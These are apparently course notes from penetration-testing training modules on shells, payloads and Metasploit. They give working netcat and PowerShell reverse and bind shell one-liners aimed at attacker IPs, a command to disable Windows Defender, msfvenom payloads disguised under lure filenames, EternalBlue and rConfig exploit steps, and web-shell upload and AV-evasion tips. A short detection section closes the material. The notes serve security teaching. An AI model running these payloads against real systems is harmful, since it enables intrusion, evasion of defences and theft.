Access & Tooling/Module 08

Shells & Payloads

🔍 What is a Shell?

A shell is a program that provides a user with an interface to input instructions into the system and view text output. Examples include bash, zsh, cmd, and PowerShell.

In penetration testing, gaining a shell typically means you have:
- Exploited a vulnerability
- Bypassed security measures
- Gained interactive remote access to a target system

Common phrases that indicate a successful shell:

"I caught a shell."
"I popped a shell!"
"I dropped into a shell!"
"I'm in!"

🎯 Why Get a Shell?

A shell gives you direct access to:
- OS — run system-level commands
- File system — read, write, exfiltrate files
- Privilege escalation vectors — look for SUID binaries, misconfigs
- Lateral movement — pivot to other hosts
- Persistence — maintain access over time

💡 Key insight: Command-line shells are harder to detect than graphical remote access (VNC/RDP), faster to navigate, and easier to automate.

🧠 Shell Perspectives

Perspective Description
Computing Text-based interface for OS tasks (Bash, Zsh, cmd, PowerShell)
Exploitation & Security Result of exploiting a vuln to gain interactive access (e.g., EternalBlue → cmd)
Web Script uploaded to a web server that gives command execution via browser

🏗️ Anatomy of a Shell

Every OS has a shell. To interact with it, you need a terminal emulator.

Common Terminal Emulators

Terminal Emulator OS
Windows Terminal Windows
cmder Windows
PuTTY Windows
kitty Windows, Linux, macOS
Alacritty Windows, Linux, macOS
xterm Linux
GNOME Terminal Linux
MATE Terminal Linux
Konsole Linux
Terminal macOS
iTerm2 macOS

⌨️ Command Language Interpreters

A command language interpreter translates your commands to the OS for execution. It is NOT the same as the terminal emulator — the terminal is the window, the interpreter is the engine.

Also referred to as shell scripting languages or Command and Scripting Interpreters per MITRE ATT&CK Execution techniques.

Identifying Which Shell You're In

Method 1: The prompt character
- $ → Bash, Ksh, POSIX, and similar
- PS C:\> → PowerShell
- C:\> → Windows CMD

Method 2: Using ps (Linux)

ps

PID TTY          TIME CMD
4232 pts/1   00:00:00 bash
11435 pts/1  00:00:00 ps

Why: Lists running processes. If bash appears as your process, you're in a bash shell.

Method 3: Using env (Linux/macOS)

env

SHELL=/bin/bash

Why: The SHELL environment variable explicitly tells you the path to the active shell interpreter.

🔗 Bind Shells

What is a Bind Shell?

In a bind shell, the target starts a listener on a port and waits for the attacker to connect to it.

[Attacker]  ──────connect──────▶  [Target: listener on port 7777]

Challenges with Bind Shells

  • A listener must already be running on the target
  • Incoming firewall rules on the target will likely block your connection
  • NAT/PAT at the network edge makes this difficult from outside
  • OS firewalls (Windows Defender Firewall, iptables) block unexpected inbound connections

💡 Key takeaway: Bind shells are easy to defend against because the connection comes inbound to the target, which firewalls monitor closely.

🛠️ Tool: GNU Netcat (nc)

Netcat is the "Swiss Army Knife" of networking. It can:
- Open and listen on TCP/UDP sockets
- Act as a client or server
- Work over IPv4 and IPv6
- Proxy data between connections
- Handle text I/O

Practicing Bind Shells with Netcat

Step 1 — Start listener on TARGET

nc -lvnp 7777
Flag Meaning
-l Listen mode (wait for incoming connections)
-v Verbose — show connection info
-n No DNS resolution (faster, avoids DNS lookups)
-p 7777 Port to listen on

Why: This makes the target wait for a connection on port 7777. Without this running first, your attacker-side connect will fail.

Expected output:

Listening on [0.0.0.0] (family 0, port 7777)

Step 2 — Connect from ATTACKER

nc -nv 10.129.41.200 7777
Flag Meaning
-n No DNS
-v Verbose
10.129.41.200 Target IP
7777 Port the target is listening on

Why: Connects your attack box to the target's listener. At this point you have a raw TCP pipe — not yet a shell.

Expected output:

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!

Step 3 — Establish a TRUE Bind Shell on TARGET

The previous step only created a TCP session. This command actually binds a shell to that session:

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

Breaking it down:

Part What it does
rm -f /tmp/f Removes any existing /tmp/f file to start clean (-f ignores if not found)
mkfifo /tmp/f Creates a named pipe (FIFO) at /tmp/f — this is a special file that acts as a relay
cat /tmp/f \| Reads from the pipe and pipes output into the next command
/bin/bash -i 2>&1 \| Starts an interactive bash shell; 2>&1 merges stderr into stdout so errors are also sent back
nc -l 10.129.41.200 7777 Netcat listens on port 7777; receives commands and sends shell output back
> /tmp/f Redirects Netcat's output (attacker's commands) back into the FIFO pipe, completing the loop

💡 The loop: Commands from attacker → Netcat → pipe → bash → output → Netcat → back to attacker. The named pipe is the "glue" that makes this bidirectional.

Step 4 — Connect from ATTACKER to get shell access

nc -nv 10.129.41.200 7777

What you get next: After connecting, you now have an interactive shell on the target.

🔄 Reverse Shells

What is a Reverse Shell?

In a reverse shell, the attacker starts the listener, and the target connects back to the attacker.

[Attacker: listener] ◀──────connect──────  [Target]

Why this is better: Outbound connections from a target are far less monitored than inbound. Most firewalls block incoming connections but allow outgoing ones.

Methods to force a target to initiate a connection:

  • Unrestricted File Upload
  • Command Injection
  • Remote Code Execution (RCE)
  • Social engineering (malicious attachment)

📎 Resource: Reverse Shell Cheat Sheet — comprehensive list of one-liners across many languages.

Reverse Shell with Netcat — Linux

Step 1 — Start listener on ATTACKER (port 443)

sudo nc -lvnp 443

Why port 443? Port 443 is the standard HTTPS port. Outbound traffic on 443 is rarely blocked since all HTTPS web browsing uses it. This gives better evasion than a random high port like 4444.

Step 2 — Execute reverse shell on TARGET (Linux bash one-liner)

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

Same mechanics as the bind shell one-liner, but instead of listening, Netcat connects back to your attack box IP and port.

Reverse Shell with PowerShell — Windows

Step 1 — Start listener on ATTACKER

sudo nc -lvnp 443

Step 2 — Run on TARGET (Windows, in cmd.exe)

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

⚠️ Windows Defender will block this by default. You'll see: This script contains malicious content and has been blocked by your antivirus software.

Disable Windows Defender (for lab/testing only)

Set-MpPreference -DisableRealtimeMonitoring $true

Why: In a real engagement, you would need to use obfuscated or encoded payloads to bypass AV. In lab environments, you can disable it directly (requires admin PowerShell).

🔬 One-Liners Examined

Netcat/Bash Reverse Shell — Full Breakdown

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
Part Explanation
rm -f /tmp/f Cleans up any leftover pipe file from previous runs
mkfifo /tmp/f Creates a named FIFO pipe at /tmp/f — this is the relay point for I/O
cat /tmp/f \| Reads the pipe and passes its contents to bash
/bin/bash -i Launches interactive bash so you can type commands
2>&1 Merges stderr (fd 2) into stdout (fd 1) so error messages also reach you
\| nc 10.10.14.12 7777 Sends bash output to your attacker machine via Netcat
> /tmp/f Commands you send from your listener are written into the pipe, feeding bash

PowerShell One-Liner — Full Breakdown

powershell -nop -c "..."
Part Explanation
powershell Launches PowerShell (can be issued from cmd.exe — useful for RCE vulns)
-nop No profile — skips loading the user's PowerShell profile (faster, less noise)
-c Execute the command/script block that follows in quotes 
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443)

Creates a TCP connection to the attacker's IP on port 443.

$stream = $client.GetStream()

Gets the network stream object — the channel through which data will flow.

[byte[]]$bytes = 0..65535|%{0}

Creates an empty byte array (65535 zeros) — this is the buffer that receives incoming data.

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

Loop: keeps reading data from the stream until the connection closes.

$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)

Decodes the received bytes into an ASCII string (your typed commands).

$sendback = (iex $data 2>&1 | Out-String)

iex = Invoke-Expression — executes the command string on the local system. Output is captured.

$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '

Appends the current directory to the output so the attacker sees a real PS prompt like PS C:\Users\victim>.

$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()

Encodes the response as ASCII bytes and sends it back to the attacker.

$client.Close()

Gracefully closes the TCP connection when the loop ends.

⚙️ Automating Payloads with Metasploit

What is Metasploit?

Metasploit (developed by Rapid7) is an automated attack framework that:
- Streamlines vulnerability exploitation
- Provides pre-built exploit modules
- Handles payload delivery and shell sessions
- Supports post-exploitation (Meterpreter)

🔗 Metasploit Framework GitHub
🔗 Metasploit Community vs Pro comparison

Launch Metasploit

sudo msfconsole

Why: Launches the Metasploit Framework console as root, giving it the permissions needed to bind to low ports and manage raw sockets.

Enumerate the Target First

nmap -sC -sV -Pn 10.129.164.25
Flag Meaning
-sC Run default NSE scripts (banner grabbing, version detection helpers)
-sV Probe open ports for service/version info
-Pn Skip host discovery (treat as alive — useful when ICMP is blocked)

Why: Before picking an exploit, you need to know what's running. The scan result tells you OS hints, open ports, and service versions.

What to look for: Open ports like 445 (SMB), 80/443 (HTTP/S), 22 (SSH), 3389 (RDP).

Search for an Exploit Module

msf6 > search smb

Why: After identifying a service (e.g., SMB on port 445), search for related exploit modules.

msf6 > use 56

or

msf6 > use exploit/windows/smb/psexec

Why: Selects the module. The number is relative to your search results.

Examine Module Options

msf6 exploit(windows/smb/psexec) > options

Why: Shows all configurable parameters. Required fields must be filled in. Common fields:

Option What it is
RHOSTS Target IP address(es)
RPORT Target port (usually pre-filled)
SMBUser Username for authentication
SMBPass Password for authentication
LHOST Your attacker IP (where the shell connects back to)
LPORT Your listener port (default 4444)

Configure and Run

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
msf6 exploit(windows/smb/psexec) > exploit

What happens: MSF authenticates to the target via SMB, uploads the psexec payload, executes it, and you receive a Meterpreter shell.

What is Meterpreter?

Meterpreter is an advanced in-memory payload that:
- Injects into a running process (no file written to disk by default)
- Provides an encrypted communication channel
- Supports file upload/download, keylogging, process management, privilege escalation, and more
- Is significantly more powerful than a raw bash/cmd shell

Useful Meterpreter Commands

meterpreter > getuid          # Show current user
meterpreter > shell           # Drop into native OS shell (cmd.exe or bash)
meterpreter > ?               # List all available commands

What to do next: Once in a Meterpreter session, use shell to get a system shell, then enumerate for privilege escalation paths.

🔨 Crafting Payloads with MSFvenom

What is MSFvenom?

MSFvenom combines the payload generation of msfpayload and the encoding of msfencode into a single tool. It can:
- Generate standalone payload files (.elf, .exe, .php, .asp, .war, etc.)
- Encode/encrypt payloads to bypass AV
- Output in dozens of formats

List All Available Payloads

msfvenom -l payloads

Why: Gives you the full list of ~592 payloads. Useful for finding the right payload for a specific OS/architecture.

What to look for: Payloads are named by OS, then architecture, then type:

linux/x86/shell_reverse_tcp
windows/meterpreter/reverse_tcp
osx/armle/shell_reverse_tcp

📦 Staged vs Stageless Payloads

This is a critical concept for both attack success and AV evasion.

Staged Payloads

A staged payload sends a small initial stager to the target, which then calls back to download and execute the full payload.

How to identify: Slashes between components in the name.

linux/x86/shell/reverse_tcp      ← staged (shell/ then reverse_tcp)
windows/meterpreter/reverse_tcp  ← staged

Pros: Smaller initial payload, easier to sneak past size restrictions.
Cons: Requires a stable network connection for the second stage download; can fail on unstable links.

Stageless Payloads

A stageless payload contains everything in a single payload sent all at once.

How to identify: No slash separating the type from the transport.

linux/zarch/meterpreter_reverse_tcp   ← stageless (meterpreter_reverse_tcp together)
windows/meterpreter_reverse_tcp       ← stageless

Pros: More reliable on slow/unstable networks; less traffic (better for evasion).
Cons: Larger file size.

🔗 Rapid7 blog on stageless Meterpreter payloads

Build a Stageless Linux Payload

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
Part Explanation
-p linux/x64/shell_reverse_tcp Stageless reverse shell for 64-bit Linux
LHOST=10.10.14.113 Your attack box IP — the target calls back here
LPORT=443 Port your listener is on
-f elf Output format: ELF (Linux executable)
> createbackup.elf Save as this filename (name it something innocuous!)

What to do next: Get the file onto the target (email, web, SMB, USB), start your listener (sudo nc -lvnp 443), then execute it on the target.

Build a Stageless Windows Payload

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
Part Explanation
-p windows/shell_reverse_tcp Stageless reverse shell for 32-bit Windows
-f exe Output as Windows PE executable
> BonusCompensationPlanpdf.exe Named to entice victims to click (social engineering)

⚠️ Without AV bypass techniques, Windows Defender will catch this. This is purely for lab/controlled environments or when AV is disabled.

Other MSFvenom Payload Examples (from Cheatsheet)

# macOS reverse shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho

# ASP web reverse shell (for IIS servers)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp

# JSP web reverse shell (for Tomcat/Java servers)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp

# WAR file (for Tomcat WAR deployment)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war

🪟 Infiltrating Windows

Fingerprinting a Windows Host

Method 1: TTL via Ping

ping 192.168.86.39

Windows hosts typically respond with a TTL of 128. Linux is usually 64, Cisco devices 255.

Method 2: Nmap OS Detection

sudo nmap -v -O 192.168.86.39

Why: Nmap fingerprints the TCP/IP stack behavior and matches it against a database to guess the OS.

What to look for:

OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909

Method 3: Nmap Banner Grabbing

sudo nmap -v 192.168.86.39 --script banner.nse

Why: The banner.nse script connects to each open port and captures the service banner — what the service says when you first connect.

Prominent Windows Vulnerabilities to Know

Vulnerability CVE Description
MS08-067 — Critical SMB flaw; used by Conficker and Stuxnet worms
EternalBlue MS17-010 NSA exploit leaked by Shadow Brokers; used in WannaCry and NotPetya; affects SMBv1
PrintNightmare CVE-2021-34527 RCE via Windows Print Spooler; grants SYSTEM access
BlueKeep CVE-2019-0708 RCE via RDP protocol; affects Windows 2000–Server 2008 R2
Sigred CVE-2020-1350 DNS SIG record flaw; can grant Domain Admin
SeriousSam CVE-2021-36924 SAM database readable by unprivileged users via VSS
Zerologon CVE-2020-1472 Cryptographic flaw in Netlogon; ~256 guesses to auth as domain controller

Example: EternalBlue (MS17-010) Attack Chain

Step 1 — Enumerate

nmap -v -A 10.129.201.97

What to look for: Port 445 open (SMB), Windows Server OS version in the range 2008-2016.

Step 2 — Validate Vulnerability

msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

Expected output if vulnerable:

[+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010!

Why this step matters: Confirm before exploiting. Running an exploit on a non-vulnerable host can crash it.

Step 3 — Exploit

msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.201.97
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.12
msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

Expected success:

[+] SYSTEM session obtained!
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

Windows Shell Types: CMD vs PowerShell

Feature CMD PowerShell
Type Text I/O .NET object I/O
History Not kept Kept
Traceability Lower Higher
Presence All Windows (XP+) Windows 7+
.NET access No Yes
Cmdlets/modules No Yes

Use CMD when:
- Target is old (XP, no PowerShell available)
- You need simple commands
- Stealth is critical (less logging)
- Execution policies might block PS

Use PowerShell when:
- You need complex automation
- Working with .NET objects
- Interacting with cloud services (Azure, AWS)
- Using custom modules/cmdlets

⚠️ WSL (Windows Subsystem for Linux): Traffic from WSL is not parsed by Windows Firewall or Defender — making it a blind spot for defenders. Attackers have been observed using Python3 and Linux binaries through WSL to bypass AV/EDR.

Windows Payload Types

Type Extension Description
DLL .dll Dynamic Linking Library; inject to escalate to SYSTEM or bypass UAC
Batch .bat DOS scripts; automate commands like opening ports or enumerating
VBScript .vbs Client-side scripting; often used in phishing to run macros
MSI .msi Windows Installer package; run with msiexec for elevated execution
PowerShell .ps1 Full scripting language with .NET access; extremely powerful

🐧 Infiltrating Unix/Linux

Over 70% of web servers run Unix-based systems (W3Techs survey).

Key Questions Before Attacking a Linux Host

  1. What Linux distribution is running?
  2. What shell and programming languages are present? (bash, python, perl, ruby, php?)
  3. What function does this host serve?
  4. What applications are hosted?
  5. Are there known CVEs for this version?

Example: Attacking rConfig 3.9.6

rConfig is a network configuration management tool used by admins to remotely configure routers and switches. Compromising it could mean access to ALL network devices.

Step 1 — Enumerate

nmap -sC -sV 10.129.201.101

What you find: Apache 2.4.6, PHP 7.2.34, MySQL, FTP, OpenSSH on CentOS.

Then browse to the IP to discover the application: rConfig v3.9.6

Step 2 — Search for Exploits

msf6 > search rconfig

Or search manually: rConfig 3.9.6 vulnerability

Relevant module found:

exploit/linux/http/rconfig_vendors_auth_file_upload_rce

🔗 rConfig exploit on Exploit-DB
🔗 Rapid7 Module GitHub Source

Step 3 — Exploit

msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

What this exploit does:
1. Checks rConfig version (confirms 3.9.6)
2. Authenticates to rConfig web interface (default creds)
3. Uploads a PHP reverse shell payload
4. Triggers the payload
5. Deletes the uploaded file
6. Returns a Meterpreter session

Spawning a TTY Shell (from non-interactive shell)

When you land in a shell via an exploit, you often get a non-TTY shell — limited, no prompt, can't use su/sudo.

Check if Python is available:

which python
which python3

Spawn TTY shell with Python:

python -c 'import pty; pty.spawn("/bin/sh")'

Why: The pty module creates a pseudo-terminal (PTY), giving you a proper interactive shell with a prompt and full command support.

What you see after:

sh-4.2$ whoami
apache

🖥️ Spawning Interactive Shells

When you can't use Python (or just need alternatives), you have many options:

/bin/sh Direct

/bin/sh -i

-i = interactive mode. Simple but gives a basic shell.

Perl

perl -e 'exec "/bin/sh";'

Or from within a script:

exec "/bin/sh";

Ruby

ruby -e 'exec "/bin/sh"'

Or from a script:

exec "/bin/sh"

Lua

lua -e "os.execute('/bin/sh')"

Or from a script:

os.execute('/bin/sh')

AWK

awk 'BEGIN {system("/bin/sh")}'

Why AWK?: AWK is present on virtually every Unix/Linux system. This uses AWK's system() function to exec a shell.

Find (with exec)

find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

Or simpler:

find . -exec /bin/sh \; -quit

Why: find's -exec flag runs a command for each result. -quit stops after the first match.

VIM (Escaping Jail Shells)

vim -c ':!/bin/sh'

Or from within VIM:

:set shell=/bin/sh
:shell

Why: Occasionally you land on a system where VIM is available but direct shell access is restricted. VIM's shell escape lets you break out.

Checking Permissions

ls -la <path/to/file>

Why: Check what permissions you (current user) have on a binary or file.

sudo -l

Why: Lists what commands the current user can run as sudo. Look for NOPASSWD entries — these are immediate escalation vectors.

Example output (jackpot!):

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL

This means apache can run ANY command as root with no password!

🌐 Introduction to Web Shells

A web shell is a script uploaded to a web server that allows an attacker to run OS commands through a web browser.

Why Web Shells?

During external penetration tests, hardened perimeters often don't expose SMB or RDP. What IS exposed is web applications. Web shells allow you to:
- Execute commands on the underlying OS
- Establish initial foothold
- Upload further tools
- Later upgrade to a reverse shell for better stability

Common Upload Vectors

  • Public file upload forms
  • Authenticated file upload (user profile pictures, etc.)
  • Tomcat/Axis2/WebLogic WAR deployments
  • Misconfigured FTP pointing to webroot
  • SQL injection with INTO OUTFILE

⚠️ Limitation: Web shells can be unstable (deleted by the app, session timeouts). Use them to establish a proper reverse shell ASAP, then clean up.

🔧 Laudanum Web Shell

Laudanum is a collection of ready-made web shell files for many languages (ASP, ASPX, JSP, PHP, etc.) built into Parrot OS and Kali by default.

🔗 Laudanum on GitHub

Location on Parrot OS / Pwnbox

/usr/share/laudanum/
/usr/share/webshells/laudanum/   ← (cheatsheet location)

Using the ASPX Laudanum Shell

Step 1 — Copy and modify

cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx

Why copy: Never modify the original. Work on a copy.

What to modify: Open the file and add your attacker IP to the allowedIps variable (line 59). This prevents others from stumbling on your shell.

Also: Remove ASCII art and comments. AV and IDS tools signature on these patterns.

Step 2 — Upload to target

Use the application's file upload functionality. Navigate to the uploaded file in your browser.

Step 3 — Execute commands

Navigate to the shell URL (e.g., http://target/files/demo.aspx) and issue commands via the web form.

🔧 Antak Web Shell (ASPX / PowerShell)

Antak is a web shell built in ASP.NET, part of the Nishang offensive PowerShell framework. It provides a PowerShell-themed interface.

🔗 Nishang on GitHub
🔗 IPPSEC.rocks — search "aspx" to find video demonstrations of ASPX web shells

What is Nishang?

Nishang is an Offensive PowerShell toolset containing implants and scripts for:
- Reverse shells
- Bind shells
- Web shells (Antak)
- Privilege escalation
- Persistence
- Information gathering

Location on Parrot OS / Pwnbox

/usr/share/nishang/Antak-WebShell/

ls /usr/share/nishang/Antak-WebShell
# antak.aspx  Readme.md

Using Antak

Step 1 — Copy and modify

cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx

What to modify: Open the file and set credentials on line 14 (username and password). This protects your shell from random access.

Remove ASCII art and comments to reduce AV signatures.

Step 2 — Upload and access

Upload to the target. Navigate to the file. You'll see a login prompt — enter your credentials.

Step 3 — Issue commands

From the Antak interface you can:
- Run PowerShell commands
- Upload and download files
- Encode and execute scripts
- Execute SQL queries
- Parse web.config files

What to do next: Use it to download a Meterpreter payload and execute it, upgrading from web shell to a full reverse shell session.

🔧 PHP Web Shells

PHP powers ~78.6% of all websites with a known server-side language (W3Techs, 2021). PHP web shells are extremely common.

What is ASPX? (Quick Reference)

ASPX (Active Server Page Extended) is for Microsoft's ASP.NET framework. ASPX web shells like Antak use this to run server-side code and interact with the OS.

Hands-on: PHP Shell via rConfig

🔗 WhiteWinterWolf's PHP Web Shell

The Challenge: File Type Restriction

rConfig only allows image uploads (.png, .jpg, .gif). To upload a .php file, we bypass the client-side check using Burp Suite as a proxy.

Step 1 — Configure Browser Proxy

Set browser to use 127.0.0.1:8080 as HTTP proxy (Burp's default listening address).

Step 2 — Upload PHP file, intercept with Burp

Select your .php shell file via the upload form. Burp intercepts the POST request.

Step 3 — Modify Content-Type in Burp

Find this line in the intercepted request:

Content-Type: application/x-php

Change it to:

Content-Type: image/gif

Why: The server-side validation checks the Content-Type header, not the actual file content. Changing it tricks the server into accepting the PHP file.

Click Forward to send the modified request.

Step 4 — Navigate to your shell

https://10.129.201.101/images/vendor/connect.php

Step 5 — Execute commands

The PHP web shell interface lets you run OS commands directly. Test with:

sudo -l

If you see NOPASSWD: ALL — you have a direct path to full root.

🔍 Detection & Prevention

MITRE ATT&CK Framework

🔗 MITRE ATT&CK Enterprise Framework

Three key tactics related to Shells & Payloads:

Tactic Description
Initial Access Compromising public-facing hosts/services (web apps, SMB, auth protocols)
Execution Running attacker-supplied code on the victim host — this is what shells & payloads achieve
Command & Control (C2) Maintaining persistent, interactive access through the established shell

Events to Monitor

File Uploads
- Web application file upload logs
- Check for unexpected file types in upload directories
- Use WAF rules to flag script extensions in uploads

Suspicious User Actions
- Non-admin users running whoami, ipconfig, net user
- Unexpected SMB connections between endpoints (not to servers)
- Enable PowerShell Script Block Logging and Module Logging

Anomalous Network Sessions
- Traffic on non-standard ports (especially 4444 — Meterpreter default)
- High-frequency outbound connections (heartbeat pattern = C2)
- Bulk GET/POST requests in short time
- Unencrypted shell traffic on standard ports (Wireshark/PCAP analysis)

Netcat Traffic — Visible in Wireshark

Netcat shells send all traffic in plaintext. A defender capturing traffic can see every command you run:

c:\>net user hacker Passw0rd1 /add
c:\>net localgroup administrators hacker /add

💡 Attacker lesson: Use encrypted channels (HTTPS Meterpreter, SSH tunnels) to avoid traffic inspection. Unencrypted Netcat shells are detection candy.

Potential Mitigations

Mitigation Description
Application Sandboxing Limit damage scope if a web app is compromised
Least Privilege Users and services only get the permissions they need
Host Segmentation DMZ for internet-facing hosts; prevent lateral movement
Physical & App-layer Firewalls Block bind shells (inbound) and detect reverse shells (outbound on unusual ports)
AV/EDR on all endpoints Windows Defender minimum; EDR for behavioral detection
Patch Management Keep Windows updated — MS08-067, EternalBlue, PrintNightmare all have patches

📋 Full Command Cheatsheet

Connectivity

# RDP into Windows foothold
xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!

Shell Identification

# Check current shell via environment variable
env

# Check current shell via process list
ps

Netcat Shells

# Start a listener (attacker side)
sudo nc -lvnp <port>

# Connect to a listener
nc -nv <target-ip> <port>

# Bind shell on target (Linux)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

# Reverse shell connection (run on target, connects to attacker)
nc <attacker-ip> <port> -e /bin/bash

PowerShell Reverse Shell

# Disable Defender (lab only / requires admin PS)
Set-MpPreference -DisableRealtimeMonitoring $true

# PowerShell reverse shell one-liner (run from cmd.exe on target)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Metasploit

# Launch MSF
sudo msfconsole

# Check EternalBlue vulnerability
use auxiliary/scanner/smb/smb_ms17_010

# EternalBlue exploit (psexec variant)
use exploit/windows/smb/ms17_010_psexec

# PSExec exploit (requires valid creds)
use exploit/windows/smb/psexec

# rConfig 3.9.6 exploit
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

# Drop into system shell from Meterpreter
shell

MSFvenom Payload Generation

# Linux stageless reverse shell (ELF)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > shell.elf

# Windows stageless reverse shell (EXE)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > shell.exe

# macOS reverse shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > shell.macho

# ASP reverse shell (IIS)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > shell.asp

# JSP reverse shell (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > shell.jsp

# WAR reverse shell (Tomcat WAR deploy)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > shell.war

# List all payloads
msfvenom -l payloads

Spawning Interactive/TTY Shells

# Python (most reliable if available)
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

# Bash interactive
/bin/sh -i

# Perl
perl -e 'exec "/bin/sh";'

# Ruby
ruby -e 'exec "/bin/sh"'

# Lua
lua -e "os.execute('/bin/sh')"

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find + AWK combo
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# Find direct exec
find . -exec /bin/sh \; -quit

# VIM escape

# List file permissions

Access & Tooling/Module 09

Using the Metasploit Framework

Preface — Why Tools Matter

The debate around using automated tools in penetration testing is ongoing. The key takeaways from HTB's perspective:

  • Don't get tunnel vision. A tool is a means, not the backbone of your assessment.
  • Know your tools inside and out. Unexpected behaviour can expose you or your client.
  • Tools save time — freeing you to focus on deeper, more complex security research.
  • Tools can leave traces on target systems and expose your attacker platform. Always audit what a tool does before running it.

Mindset: Use the tool as a tool, not life support. Time is money in an engagement, and automated tools let you hit high-impact findings faster.

Introduction to Metasploit

Metasploit is a Ruby-based, modular penetration testing platform. It lets you write, test, and execute exploit code — either custom-built or from its built-in database of known, modularized exploits.

Two Versions

Version Key Extras
Metasploit Framework (free) CLI via msfconsole, all core features
Metasploit Pro (paid) GUI, Task Chains, Social Engineering, Nexpose Integration, VPN Pivoting, Reporting, etc.

MSF Engagement Structure

The framework maps to a natural pentest workflow:

Enumeration → Preparation → Exploitation → Privilege Escalation → Post-Exploitation

Each phase has dedicated module categories and tools inside MSF.

Metasploit Architecture

All base files live at:

/usr/share/metasploit-framework/
Directory Purpose
modules/ All exploits, payloads, auxiliary, encoders, post, nops, evasion
plugins/ Third-party plugin .rb files (Nessus, sqlmap, OpenVAS, etc.)
scripts/meterpreter/ Meterpreter automation scripts
tools/ Standalone CLI utilities (recon, password, payload tools)
data/ Wordlists, templates, named pipes lists

The ~/.msf4/ folder in your home directory mirrors this structure for user-specific customizations.

MSFconsole — The Primary Interface

msfconsole is the primary, most stable way to interact with Metasploit.

Launching

msfconsole          # Full banner + prompt
msfconsole -q       # Quiet mode — skips the ASCII art, faster startup

Why quiet mode? When you're in a time-sensitive engagement and already know the tool, the banner is just noise.

Installing / Updating

